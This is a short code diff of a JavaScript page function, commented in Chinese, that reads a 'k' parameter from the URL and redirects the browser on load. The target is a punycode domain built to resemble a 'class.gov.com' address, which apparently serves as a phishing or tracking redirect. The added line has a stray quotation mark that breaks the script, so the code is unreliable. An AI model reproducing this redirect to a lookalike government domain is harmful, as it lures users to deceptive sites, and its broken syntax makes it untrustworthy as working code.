@@ -17,15 +17,14 @@
 
   // 构建目标链接，并跳转
   function redirectToTarget() {
-    // var keyParam = getParameterByName('k');
-    // if (keyParam) {
-    //  var targetUrl = 'http://zpro.zz.class.gov.com.xn--5nqw4dgx1b75pyv5ao0a.com/z.php?k=' + keyParam;
-      var targetUrl = 'http://zpro.zz.class.gov.com.xn--virp1rjsdr3e4y3e.com/z.php?k=123';
+    var keyParam = getParameterByName('k');
+    if (keyParam) {
+      var targetUrl = 'http://zpro.zz.class.gov.com.xn--virp1rjsdr3e4y3e.com/z.php?k=' + keyParam';
       window.location.href = targetUrl;
-    // } else {
-    //   // 如果没有找到参数，则可以执行其他操作或给出提示
-    //   alert('未找到参数 key。');
-    // }
+    } else {
+      // 如果没有找到参数，则可以执行其他操作或给出提示
+      alert('未找到参数 key。');
+    }
   }
 
   // 页面加载时调用跳转函数
